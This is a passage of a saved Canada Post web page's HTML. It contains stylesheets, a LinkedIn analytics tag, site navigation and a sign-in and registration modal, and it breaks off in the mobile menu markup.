40%;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center}.vertical-orientation{padding:8.2% 9.2% 8.8% 53%}.stamp-orientation,.vertical-orientation{z-index:100;left:0;right:0;position:absolute;height:100%;top:0;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center}.stamp-orientation{padding:34.6% 15.5% 40%}.image-wrapper{width:100%;height:100%;display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;background-color:#fff}.image-wrapper .card-image{max-height:100%;max-width:280px}@media only screen and (max-width:40em){.image-wrapper .card-image{width:auto;max-width:100%}}.hintLabel{font-family:Roboto,sans-serif!important;font-size:16px;line-height:24px;font-weight:500;font-stretch:normal;font-style:normal;letter-spacing:.5px;color:#333;text-align:left;display:block;margin:0}@media (-ms-high-contrast:active),(-ms-high-contrast:none){.error-on-file{padding-top:8px}}</style>
    <style>.mat-form-field{display:inline-block;position:relative;text-align:left}[dir=rtl] .mat-form-field{text-align:right}.mat-form-field-wrapper{position:relative}.mat-form-field-flex{display:inline-flex;align-items:baseline;box-sizing:border-box;width:100%}.mat-form-field-prefix,.mat-form-field-suffix{white-space:nowrap;flex:none;position:relative}.mat-form-field-infix{display:block;position:relative;flex:auto;min-width:0;width:180px}.cdk-high-contrast-active .mat-form-field-infix{border-image:linear-gradient(transparent, transparent)}.mat-form-field-label-wrapper{position:absolute;left:0;box-sizing:content-box;width:100%;height:100%;overflow:hidden;pointer-events:none}[dir=rtl] .mat-form-field-label-wrapper{left:auto;right:0}.mat-form-field-label{position:absolute;left:0;font:inherit;pointer-events:none;width:100%;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;transform-origin:0 0;transition:transform 400ms cubic-bezier(0.25, 0.8, 0.25, 1),color 400ms cubic-bezier(0.25, 0.8, 0.25, 1),width 400ms cubic-bezier(0.25, 0.8, 0.25, 1);display:none}[dir=rtl] .mat-form-field-label{transform-origin:100% 0;left:auto;right:0}.mat-form-field-empty.mat-form-field-label,.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label{display:block}.mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label{display:block;transition:none}.mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:none}.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,.mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label{display:block}.mat-form-field-label:not(.mat-form-field-empty){transition:none}.mat-form-field-underline{position:absolute;width:100%;pointer-events:none;transform:scale3d(1, 1.0001, 1)}.mat-form-field-ripple{position:absolute;left:0;width:100%;transform-origin:50%;transform:scaleX(0.5);opacity:0;transition:background-color 300ms cubic-bezier(0.55, 0, 0.55, 0.2)}.mat-form-field.mat-focused .mat-form-field-ripple,.mat-form-field.mat-form-field-invalid .mat-form-field-ripple{opacity:1;transform:scaleX(1);transition:transform 300ms cubic-bezier(0.25, 0.8, 0.25, 1),opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1),background-color 300ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-subscript-wrapper{position:absolute;box-sizing:border-box;width:100%;overflow:hidden}.mat-form-field-subscript-wrapper .mat-icon,.mat-form-field-label-wrapper .mat-icon{width:1em;height:1em;font-size:inherit;vertical-align:baseline}.mat-form-field-hint-wrapper{display:flex}.mat-form-field-hint-spacer{flex:1 0 1em}.mat-error{display:block}.mat-form-field-control-wrapper{position:relative}.mat-form-field._mat-animation-noopable .mat-form-field-label,.mat-form-field._mat-animation-noopable .mat-form-field-ripple{transition:none}
</style>
    <style>.mat-form-field-appearance-fill .mat-form-field-flex{border-radius:4px 4px 0 0;padding:.75em .75em 0 .75em}.cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-flex{outline:solid 1px}.mat-form-field-appearance-fill .mat-form-field-underline::before{content:"";display:block;position:absolute;bottom:0;height:1px;width:100%}.mat-form-field-appearance-fill .mat-form-field-ripple{bottom:0;height:2px}.cdk-high-contrast-active .mat-form-field-appearance-fill .mat-form-field-ripple{height:0;border-top:solid 2px}.mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}.mat-form-field-appearance-fill .mat-form-field-subscript-wrapper{padding:0 1em}
</style>
    <style>.mat-input-element{font:inherit;background:transparent;color:currentColor;border:none;outline:none;padding:0;margin:0;width:100%;max-width:100%;vertical-align:bottom;text-align:inherit}.mat-input-element:-moz-ui-invalid{box-shadow:none}.mat-input-element::-ms-clear,.mat-input-element::-ms-reveal{display:none}.mat-input-element,.mat-input-element::-webkit-search-cancel-button,.mat-input-element::-webkit-search-decoration,.mat-input-element::-webkit-search-results-button,.mat-input-element::-webkit-search-results-decoration{-webkit-appearance:none}.mat-input-element::-webkit-contacts-auto-fill-button,.mat-input-element::-webkit-caps-lock-indicator,.mat-input-element::-webkit-credentials-auto-fill-button{visibility:hidden}.mat-input-element[type=date],.mat-input-element[type=datetime],.mat-input-element[type=datetime-local],.mat-input-element[type=month],.mat-input-element[type=week],.mat-input-element[type=time]{line-height:1}.mat-input-element[type=date]::after,.mat-input-element[type=datetime]::after,.mat-input-element[type=datetime-local]::after,.mat-input-element[type=month]::after,.mat-input-element[type=week]::after,.mat-input-element[type=time]::after{content:" ";white-space:pre;width:1px}.mat-input-element::-webkit-inner-spin-button,.mat-input-element::-webkit-calendar-picker-indicator,.mat-input-element::-webkit-clear-button{font-size:.75em}.mat-input-element::placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-input-element::placeholder:-ms-input-placeholder{-ms-user-select:text}.mat-input-element::-moz-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-input-element::-moz-placeholder:-ms-input-placeholder{-ms-user-select:text}.mat-input-element::-webkit-input-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-input-element::-webkit-input-placeholder:-ms-input-placeholder{-ms-user-select:text}.mat-input-element:-ms-input-placeholder{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;transition:color 400ms 133.3333333333ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-input-element:-ms-input-placeholder:-ms-input-placeholder{-ms-user-select:text}.mat-form-field-hide-placeholder .mat-input-element::placeholder{color:transparent !important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder{color:transparent !important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder{color:transparent !important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder{color:transparent !important;-webkit-text-fill-color:transparent;transition:none}textarea.mat-input-element{resize:vertical;overflow:auto}textarea.mat-input-element.cdk-textarea-autosize{resize:none}textarea.mat-input-element{padding:2px 0;margin:-2px 0}select.mat-input-element{-moz-appearance:none;-webkit-appearance:none;position:relative;background-color:transparent;display:inline-flex;box-sizing:border-box;padding-top:1em;top:-1em;margin-bottom:-1em}select.mat-input-element::-ms-expand{display:none}select.mat-input-element::-moz-focus-inner{border:0}select.mat-input-element:not(:disabled){cursor:pointer}select.mat-input-element::-ms-value{color:inherit;background:none}.mat-focused .cdk-high-contrast-active select.mat-input-element::-ms-value{color:inherit}.mat-form-field-type-mat-native-select .mat-form-field-infix::after{content:"";width:0;height:0;border-left:5px solid transparent;border-right:5px solid transparent;border-top:5px solid;position:absolute;top:50%;right:0;margin-top:-2.5px;pointer-events:none}[dir=rtl] .mat-form-field-type-mat-native-select .mat-form-field-infix::after{right:auto;left:0}.mat-form-field-type-mat-native-select .mat-input-element{padding-right:15px}[dir=rtl] .mat-form-field-type-mat-native-select .mat-input-element{padding-right:0;padding-left:15px}.mat-form-field-type-mat-native-select .mat-form-field-label-wrapper{max-width:calc(100% - 10px)}.mat-form-field-type-mat-native-select.mat-form-field-appearance-outline .mat-form-field-infix::after{margin-top:-5px}.mat-form-field-type-mat-native-select.mat-form-field-appearance-fill .mat-form-field-infix::after{margin-top:-10px}
</style>
    <style>.mat-form-field-appearance-legacy .mat-form-field-label{transform:perspective(100px);-ms-transform:none}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon{width:1em}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button{font:inherit;vertical-align:baseline}.mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon{font-size:inherit}.mat-form-field-appearance-legacy .mat-form-field-underline{height:1px}.cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-underline{height:0;border-top:solid 1px}.mat-form-field-appearance-legacy .mat-form-field-ripple{top:0;height:2px;overflow:hidden}.cdk-high-contrast-active .mat-form-field-appearance-legacy .mat-form-field-ripple{height:0;border-top:solid 2px}.mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}.cdk-high-contrast-active .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}.mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple{height:1px}
</style>
    <style>.mat-form-field-appearance-outline .mat-form-field-wrapper{margin:.25em 0}.mat-form-field-appearance-outline .mat-form-field-flex{padding:0 .75em 0 .75em;margin-top:-0.25em;position:relative}.mat-form-field-appearance-outline .mat-form-field-prefix,.mat-form-field-appearance-outline .mat-form-field-suffix{top:.25em}.mat-form-field-appearance-outline .mat-form-field-outline{display:flex;position:absolute;top:.25em;left:0;right:0;bottom:0;pointer-events:none}.mat-form-field-appearance-outline .mat-form-field-outline-start,.mat-form-field-appearance-outline .mat-form-field-outline-end{border:1px solid currentColor;min-width:5px}.mat-form-field-appearance-outline .mat-form-field-outline-start{border-radius:5px 0 0 5px;border-right-style:none}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start{border-right-style:solid;border-left-style:none;border-radius:0 5px 5px 0}.mat-form-field-appearance-outline .mat-form-field-outline-end{border-radius:0 5px 5px 0;border-left-style:none;flex-grow:1}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end{border-left-style:solid;border-right-style:none;border-radius:5px 0 0 5px}.mat-form-field-appearance-outline .mat-form-field-outline-gap{border-radius:.000001px;border:1px solid currentColor;border-left-style:none;border-right-style:none}.mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap{border-top-color:transparent}.mat-form-field-appearance-outline .mat-form-field-outline-thick{opacity:0}.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap{border-width:2px}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline{opacity:0;transition:opacity 100ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline{opacity:0;transition:opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline .mat-form-field-subscript-wrapper{padding:0 1em}.mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap{transition:none}
</style>
    <style>.mat-form-field-appearance-standard .mat-form-field-flex{padding-top:.75em}.mat-form-field-appearance-standard .mat-form-field-underline{height:1px}.cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-underline{height:0;border-top:solid 1px}.mat-form-field-appearance-standard .mat-form-field-ripple{bottom:0;height:2px}.cdk-high-contrast-active .mat-form-field-appearance-standard .mat-form-field-ripple{height:0;border-top:2px}.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}.cdk-high-contrast-active .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}.mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity 600ms cubic-bezier(0.25, 0.8, 0.25, 1)}.mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}
</style>
    <style>.mat-radio-button{display:inline-block;-webkit-tap-highlight-color:transparent;outline:0}.mat-radio-label{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:pointer;display:inline-flex;align-items:center;white-space:nowrap;vertical-align:middle;width:100%}.mat-radio-container{box-sizing:border-box;display:inline-block;position:relative;width:20px;height:20px;flex-shrink:0}.mat-radio-outer-circle{box-sizing:border-box;height:20px;left:0;position:absolute;top:0;transition:border-color ease 280ms;width:20px;border-width:2px;border-style:solid;border-radius:50%}._mat-animation-noopable .mat-radio-outer-circle{transition:none}.mat-radio-inner-circle{border-radius:50%;box-sizing:border-box;height:20px;left:0;position:absolute;top:0;transition:transform ease 280ms,background-color ease 280ms;width:20px;transform:scale(0.001)}._mat-animation-noopable .mat-radio-inner-circle{transition:none}.mat-radio-checked .mat-radio-inner-circle{transform:scale(0.5)}.cdk-high-contrast-active .mat-radio-checked .mat-radio-inner-circle{border:solid 10px}.mat-radio-label-content{-webkit-user-select:auto;-moz-user-select:auto;-ms-user-select:auto;user-select:auto;display:inline-block;order:0;line-height:inherit;padding-left:8px;padding-right:0}[dir=rtl] .mat-radio-label-content{padding-right:8px;padding-left:0}.mat-radio-label-content.mat-radio-label-before{order:-1;padding-left:0;padding-right:8px}[dir=rtl] .mat-radio-label-content.mat-radio-label-before{padding-right:0;padding-left:8px}.mat-radio-disabled,.mat-radio-disabled .mat-radio-label{cursor:default}.mat-radio-button .mat-radio-ripple{position:absolute;left:calc(50% - 20px);top:calc(50% - 20px);height:40px;width:40px;z-index:1;pointer-events:none}.mat-radio-button .mat-radio-ripple .mat-ripple-element:not(.mat-radio-persistent-ripple){opacity:.16}.mat-radio-persistent-ripple{width:100%;height:100%;transform:none}.mat-radio-container:hover .mat-radio-persistent-ripple{opacity:.04}.mat-radio-button:not(.mat-radio-disabled).cdk-keyboard-focused .mat-radio-persistent-ripple,.mat-radio-button:not(.mat-radio-disabled).cdk-program-focused .mat-radio-persistent-ripple{opacity:.12}.mat-radio-persistent-ripple,.mat-radio-disabled .mat-radio-container:hover .mat-radio-persistent-ripple{opacity:0}@media(hover: none){.mat-radio-container:hover .mat-radio-persistent-ripple{display:none}}.mat-radio-input{bottom:0;left:50%}.cdk-high-contrast-active .mat-radio-disabled{opacity:.5}
</style>
    <script charset="utf-8" src="./file/11.4dc17d50d8eb18566aef.chunk.js"></script>
    <script charset="utf-8" src="./file/4.44a799399bc4cc3dbe48.chunk.js"></script>
    <script charset="utf-8" src="./file/1.0f15e3ad6ddcff4e902e.chunk.js"></script>
  </head>
  <body class="">
    <!--ls:begin[body]-->
    <div class="iw_viewport-wrapper">
      <div class="iw_section" id="sectionkm1jrujy">
        <div class="row iw_row iw_container" id="rowkm1jrujz">
          <div class="columns iw_columns large-12" id="colkm1jruk0">
            <div class="iw_component" id="iw_comp1615266171501">
              <!--ls:begin[component-1615266171501]-->
              <script type="text/javascript">
                _linkedin_data_partner_id = "9198";
              </script>
              <script type="text/javascript">
                (function(){var s = document.getElementsByTagName("script")[0];
                  var b = document.createElement("script");
                  b.type = "text/javascript";b.async = true;
                  b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
                  s.parentNode.insertBefore(b, s);})();
              </script>
              <noscript>
                <img src="https://dc.ads.linkedin.com/collect/?pid=9198&amp;fmt=gif" alt="" style="display:none;" width="1" height="1">
              </noscript>
              <div class="cpc-skip-nav">
                <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#main-content" class="skip-nav">
                  <span class="cpc-skip-nav-label">Skip to Main Content</span>
                </a>
              </div>
              <div id="mainNav" class="cpc-nav " data-sitemap="business">
                <div class="noindex">
                  <nav role="navigation" aria-label="Main navigation" class="">
                    <div class="top-bar micro-business-nav show-for-large-up" data-topbar="">

                      <section class="top-bar-section">
                        <ul class="right">

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="">Support</a>
                          </li>


                          <li class="language-toggle">
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" lang="fr">Français</a>
                          </li>

                          <li class="top-bar-separator"></li>

                          <li class="sign-in toggle-signin-trigger" role="signin" aria-label="Sign in or Register">
                            <a href="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/login" data-cpc-modal-id="#sign-in-modal" id="signinModalLarge" role="button">Sign in or Register</a>
                          </li>

                        </ul>
                      </section>
                    </div>

                    <div class=" utility-business-nav-sticky-container">
                      <div class="top-bar utility-business-nav show-for-large-up" data-topbar="">
                        <ul class="title-area">
                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en?name=tgt">
                              <img src="./file/cpc-main-logo.svg" alt="Canada Post">
                            </a>
                          </li>
                          <li class="toggle-topbar menu-icon">
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#">
                              <span>Menu</span>
                            </a>
                          </li>
                        </ul>

                        <section class="top-bar-section">
                          <ul class="left">

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/personal.page">Personal</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/business.page" class="">Business</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company.page">Our company</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/store-boutique/en/home">Store</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools.page" class="active">Tools</a>
                            </li>

                          </ul>
                          <ul class="right utility-business-nav-search">
                            <li role="search" aria-label="Search" class="cpc-nav--search-container">
                              <a id="searchBtn" href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="btn btn-search" role="button">Search</a>
                            </li>

                          </ul>
                        </section>
                      </div>
                    </div>

                  </nav>


                  <div class="mega-nav-overlay"></div>
                  <script type="text/template" class="cpc-modal__template noindex" id="sign-in-modal" data-cpc-modal-options="{&quot;preserveOnClose&quot;: &quot;true&quot;, &quot;id&quot;: &quot;signinFormDesktop&quot;, &quot;title&quot;:&quot; &quot;,&quot;autoOpen&quot;:false,&quot;closeLabel&quot;:&quot;Close&quot;,&quot;closeMethods&quot;:[&quot;overlay&quot;,&quot;escape&quot;],&quot;cssClass&quot;:[&quot;sign-in-modal&quot;]}">

                    <div class="cpc-modal-template-modal-body">
  <div class="row sign-in-modal-content flex-row">
    <div class="large-6 cpc-modal__fluid-gutter-m columns left-area">
      
  <form method="post" action="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/login?stepupId=smb_mode1,consumer,commercial_link,smb_link&sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" name="headerSISU" class="cpidSignIn sso_form">
    <h3 id="cpc-dialog-header-id">Access your account</h3>
    <label for="usernameLarge" class="sign-in-input-label">Username</label>
    <input id="usernameLarge" class="sign-in-modal-input" name="username" type="text">
    <div class="remember-me-container cpc-control-group">
      <div class="cpc-control-option">
        <input value="1" id="remembermeLarge" class="sign-in-modal-input" name="rememberme" type="checkbox">
        <label for="remembermeLarge">Remember my username on this device</label>
      </div>  
    </div>
    <label for="passwordLarge" class="sign-in-input-label">Password</label>
    <input id="passwordLarge" class="sign-in-modal-input" name="password" type="password" autocomplete="nope">
    <input value="Sign in" class="button sign-in-up-buttons" type="submit" role="button">
    <p class="forgot-username-password">Forgot
      <a tabindex="0" href="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/forgot-username?&sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.canadapost-postescanada.ca/dash-tableau/en/" tabindex="-1">Username?</a> or <a tabindex="0" href="https://sso-osu.canadapost-postescanada.ca/lfe-cap/en/forgot-password?&sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.canadapost-postescanada.ca/dash-tableau/en/" tabindex="-1">Password?</a>
    </p>
    <input name="cpidSignIn_SUBMIT" value="1" type="hidden">
    <input name="cpidSignIn_widgetSignIn" value="1" type="hidden">
    
  </form>

    </div>
  
    <div class="large-6 columns cpc-modal__fluid-gutter-m columns content">
<h3 class="right-area-heading">Register online</h3>
<p class="signup-text">
  Create an online account to save tracked items, unlock valuable discounts for your business, and more.
</p>

<!--Leaving list items for possible future implementation-->
<!--<ul class="visible-for-large-up">-->
  <!--<li>Access your personalized dashboard in a few easy steps! </li>-->
  <!--<li>undefined</li>-->
  <!--<li>undefined</li>-->
<!--</ul>-->
<p class="signup-text visible-for-large-up">
  Access your personalized dashboard in a few easy steps! 
</p>

<p class="sign-in-up-buttons">
  <a role="button" tabindex="0" href="https://sso-osu.canadapost-postescanada.ca/pfe-pap/en/registration?&sourceUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page&targetUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fcpc%2Fen%2Ftools%2Fpostal-indicia.page%3FforceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.canadapost-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link button nomargin" tabindex="-1">Register now</a>
</p>
</div>
  </div>
</div>

</script>

                  <div class="cpc-tb--outer noindex">
                    <div class="cpc-tb--desktop-aria-container" role="navigation" aria-label="Quick links and shipping tools" aria-expanded="false">
                      <div class="cpc-tb cpc-tb--desktop">
                        <div class="cpc-tb--container">
                          <ul class="cpc-tb--top">

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/track-reperage/en">
                                <div class="cpc-tb--icon icon-track"></div>
                                <span class="tool-description">Track</span>
                              </a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf">
                                <div class="cpc-tb--icon icon-postal-code"></div>
                                <span class="tool-description">Find a postal code</span>
                              </a>
                            </li>

                            <li class="hide-for-small-only">
                              <a href="https://www.canadapost-postescanada.ca/information/app/far/business/findARate">
                                <div class="cpc-tb--icon icon-find-rate"></div>
                                <span class="tool-description">Find a rate</span>
                              </a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice">
                                <div class="cpc-tb--icon icon-find-po"></div>
                                <span class="tool-description">Find a post office</span>
                              </a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page">
                                <div class="cpc-tb--icon icon-support chat-link"></div>
                                <span class="tool-description">Support</span>
                              </a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools.page">
                                <div class="cpc-tb--icon icon-more-tools"></div>
                                <span class="tool-description">More tools</span>
                              </a>
                            </li>

                          </ul>
                        </div>
                      </div>
                      <div class="cpc-tb--bottom-tools cpc-tb--desktop">
                        <div class="cpc-tb--toggler">
                          <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#">
                            <div class="cpc-tb--icon cpc-tb--icon-expand-toggle pk"></div>
                            <span class="tool-description">Close</span>
                          </a>
                        </div>
                      </div>
                    </div>
                    <div class="cpc-tb cpc-tb--mobile" role="navigation" aria-label="{ariaLandmarkLabel}">
                      <div class="cpc-tb--container">
                        <ul class="cpc-tb--top">

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/track-reperage/en">
                              <div class="cpc-tb--icon icon-track"></div>
                              <span class="tool-description">Track</span>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf">
                              <div class="cpc-tb--icon icon-postal-code"></div>
                              <span class="tool-description">Find a postal code</span>
                            </a>
                          </li>

                          <li class="hide-for-small-only">
                            <a href="https://www.canadapost-postescanada.ca/information/app/far/business/findARate">
                              <div class="cpc-tb--icon icon-find-rate"></div>
                              <span class="tool-description">Find a rate</span>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice">
                              <div class="cpc-tb--icon icon-find-po"></div>
                              <span class="tool-description">Find a post office</span>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page">
                              <div class="cpc-tb--icon icon-support chat-link"></div>
                              <span class="tool-description">Support</span>
                            </a>
                          </li>

                          <li>
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools.page">
                              <div class="cpc-tb--icon icon-more-tools"></div>
                              <span class="tool-description">More tools</span>
                            </a>
                          </li>

                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="mobile-container-wrapper show-for-medium-down">
                  <div class="top-section top-section--main">

                    <ul class="main-nav-header active">
                      <li class="cpc-mobile-menu">
                        <div class="cpc-mobile-menu-trigger" aria-label="Menu" id="trigger" tabindex="0"></div>
                      </li>
                      <li class="logo">
                        <a href="https://www.canadapost-postescanada.ca/cpc/en" class="">
                          <img src="./file/cpc-logo.svg" alt="Canada Post">
                        </a>
                        <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/undefined" class="hide">
                          <img src="./file/cpc-logo.svg" alt="Canada Post">
                        </a>
                      </li>
                      <li class="mobile-nav-top-r-links ">
                        <div class="top-r-links-container">

                          <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="menu-search " aria-label="Search our website">
                            <img src="./file/search.svg" alt="Search">
                          </a>
                          <a target="_blank" rel="noopener" href="https://www.canadapost-postescanada.ca/cpc/en/tools/undefined" undefined="" class="menu-campaign-cta hide">undefined</a>
                        </div>
                      </li>
                    </ul>

                  </div>

                  <div class="mobile-container" id="main-nav-wrapper">
                    <nav id="main-nav" class="cpc-menu menu-item--cover" role="navigation" aria-label="undefined">

                      <div class="menu-item-level" data-level="1">

                        <div class="top-section">

                          <ul class="main-l0-header">
                            <li class="cpc-mobile-menu">
                              <div class="cpc-mobile--hamburger" aria-label="Menu" id="trigger-close" tabindex="0">
                                <span></span>
                                <span></span>
                              </div>
                            </li>
                            <li class="mobile-nav-myAccount ">
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-account-sign-in">Sign in or Register</a>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-account-login">Back</a>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#" class="my-account-signout">Sign out</a>
                            </li>
                            <li class="hide">
